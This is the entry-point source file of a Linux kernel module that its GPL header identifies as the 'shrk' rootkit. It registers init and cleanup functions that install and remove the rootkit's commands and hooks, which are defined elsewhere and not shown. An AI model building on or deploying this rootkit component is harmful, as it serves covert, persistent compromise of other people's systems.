#include "inc/cmds.h"
#include "inc/hook.h"

// clang-format off

/*

 * shrk/kernel | kernel module for the shrk rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

MODULE_LICENSE("GPL"); // required

// prevent no previous prototype warning
int  init(void);
void cleanup(void);

// https://lore.kernel.org/lkml/20230118105215.B9DA960514@lion.mk-sys.cz/T/
module_init(init);
module_exit(cleanup);

int init() {
  if (!cmds_install()) {
    cleanup();
    return -1;
  }

  if (!hooks_install()) {
    cleanup();
    return -1;
  }

  return 0;
}

void cleanup() {
  hooks_uninstall();
  cmds_uninstall();
}
